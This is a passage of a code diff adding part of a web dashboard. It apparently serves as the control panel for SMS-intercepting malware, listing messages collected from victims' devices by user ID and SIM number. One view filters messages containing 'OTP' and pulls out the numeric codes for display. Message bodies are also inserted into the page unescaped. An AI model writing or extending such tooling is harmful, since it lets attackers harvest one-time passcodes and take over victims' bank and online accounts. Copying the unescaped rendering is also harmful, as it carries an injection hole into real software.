+      }).join(''):'<div style="padding:20px;text-align:center;color:#00e5ff44;font-size:12px">NO OTPs</div>'}
+    </div>`;
+  }else if(dtTab==='sms'){
+    document.getElementById('detailBody').innerHTML=`<div class="cd"><h3>📨 MESSAGES (${smsList.length})</h3>
+      ${smsList.length?smsList.map(s=>{
+        const body=s.body||'';
+        const ts=s.receivedDate||s.date||s.timestamp||'';
+        return `<div class="smi"><div class="av">${getDeviceBrand(uid)[0]||'?'}</div><div class="b"><div class="n">${getDeviceBrand(uid)||uid.slice(0,8)}</div><div class="m">${body}</div><div class="t">${fmtDate(ts)}${s.sim_number?` | ${s.sim_number}`:''}</div></div></div>`
+      }).join(''):'<div style="padding:20px;text-align:center;color:#00e5ff44;font-size:12px">NO MESSAGES</div>'}
+    </div>`;
+  }
+}
+
+function showAllOtps(){
+  const smsList=getAllSms();
+  const otps=smsList.filter(s=>(s.body||'').toUpperCase().includes('OTP'));
+  document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
+  document.getElementById('mainScr').classList.add('act');
+  document.getElementById('dashStats').innerHTML='';
+  document.getElementById('dashButtons').innerHTML='';
+  let html=`<div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
+    <button style="background:none;border:1px solid #00e5ff33;border-radius:6px;color:#00e5ff;font-size:18px;cursor:pointer;padding:4px 10px" onclick="renderDashboard()">‹</button>
+    <h2 style="flex:1;font-family:'Orbitron',sans-serif;font-size:13px;color:#00e5ff;letter-spacing:1px">🔑 ALL OTPs (${otps.length})</h2>
+  </div>`;
+  otps.forEach(s=>{
+    const body=s.body||'';
+    const uid=s.userId||'';
+    const ts=s.receivedDate||s.date||s.timestamp||'';
+    html+=`<div class="oi"><div class="h"><span>${getDeviceBrand(uid)||uid.slice(0,8)}</span><span>${fmtDate(ts)}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,150)}</div></div>`
+  });
+  html+=`${!otps.length?'<div style="padding:30px;text-align:center;color:#00e5ff44">NO OTPs</div>':''}`;
+  document.getElementById('dashBody').innerHTML=html;
+}
+
+function renderAllSms(){
+  const all=getAllSms();
+  document.getElementById('allSmsCnt').textContent=all.length;
+  let html=`<div class="cd"><h3>📥 ALL SMS (${all.length})</h3>`;
+  all.slice(0,200).forEach(s=>{
+    const body=s.body||'';
+    const uid=s.userId||'';
+    const ts=s.receivedDate||s.date||s.timestamp||'';
+    html+=`<div class="smi" onclick="openDevice('${uid}')"><div class="av">${getDeviceBrand(uid)[0]||'?'}</div><div class="b"><div class="n">${getDeviceBrand(uid)||uid.slice(0,8)}</div><div class="m">${body}</div><div class="t">${fmtDate(ts)}</div></div></div>`
+  });
+  html+=`${!all.length?'<div style="padding:30px;text-align:center;color:#00e5ff44;font-size:12px">NO MESSAGES</div>':''}`;
+  if(all.length>200)html+=`<div style="text-align:center;padding:10px;color:#00e5ff44;font-size:10px">SHOWING 200 OF ${all.length}</div>`;
+  html+=`</div>`;
+  document.getElementById('allSmsContent').innerHTML=html;
+}
+
+function showToast(m){
+  const t=document.getElementById('toast');t.textContent=m;t.style.opacity='1';
+  clearTimeout(t._h);t._h=setTimeout(()=>t.style.opacity='0',2500);
+}
+</script>
+</body>
+</html>
